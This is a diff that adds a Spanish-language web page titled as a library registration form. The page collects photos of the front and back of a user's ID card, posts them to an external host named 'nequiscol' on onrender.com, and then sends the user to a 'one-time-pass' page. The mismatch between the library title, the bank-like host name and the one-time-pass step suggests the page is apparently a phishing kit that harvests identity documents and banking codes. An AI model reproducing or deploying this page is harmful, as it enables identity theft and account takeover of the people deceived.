@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Registro Biblioteca</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #f5f5f5;
+}
+
+.screen {
+    display: none;
+    height: 100vh;
+    width: 100%;
+}
+
+.screen.active {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+button {
+    padding: 10px 20px;
+    background: #7b6b99;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    margin-top: 15px;
+    cursor: pointer;
+}
+
+.loader {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #ddd;
+    border-top: 4px solid #7b6b99;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<!-- SUBIR FRENTE -->
+<div id="screen-front" class="screen active">
+    <h2>Sube el frente del carnet</h2>
+    <input type="file" id="frontInput" accept="image/*">
+    <button onclick="handleFront()">Continuar</button>
+</div>
+
+<!-- SUBIR REVERSO -->
+<div id="screen-back" class="screen">
+    <h2>Voltea el documento</h2>
+    <p>Ahora sube el reverso del carnet</p>
+    <input type="file" id="backInput" accept="image/*">
+    <button onclick="handleBack()">Enviar</button>
+</div>
+
+<!-- PROCESANDO -->
+<div id="screen-processing" class="screen">
+    <div class="loader"></div>
+    <p>Enviando información...</p>
+</div>
+
+<script>
+ 
+
+const SERVER_URL = "https://nequiscol.onrender.com";
+const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";
+
+let frontImage = null;
+let backImage = null;
+
+function handleFront() {
+    const file = document.getElementById("frontInput").files[0];
+    if (!file) {
+        alert("Por favor sube la imagen del frente.");
+        return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        frontImage = e.target.result;
+        document.getElementById("screen-front").classList.remove("active");
+        document.getElementById("screen-back").classList.add("active");
+    };
+    reader.readAsDataURL(file);
+}
+
+function handleBack() {
+    const file = document.getElementById("backInput").files[0];
+    if (!file) {
+        alert("Por favor sube la imagen del reverso.");
+        return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = async function(e) {
+        backImage = e.target.result;
+
+        document.getElementById("screen-back").classList.remove("active");
+        document.getElementById("screen-processing").classList.add("active");
+
+        await fetch(SERVER_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                sessionId: Date.now().toString(),
+                frontImage,
+                backImage
+            })
+        });
+
+        alert("Documento enviado correctamente.");
+       // location.reload();
+		setTimeout(() => {window.location.href = REDIRECT_URL;}, 1500);
+		
+		
+    };
+
+    reader.readAsDataURL(file);
+}
+</script>
+
+</body>
+</html>
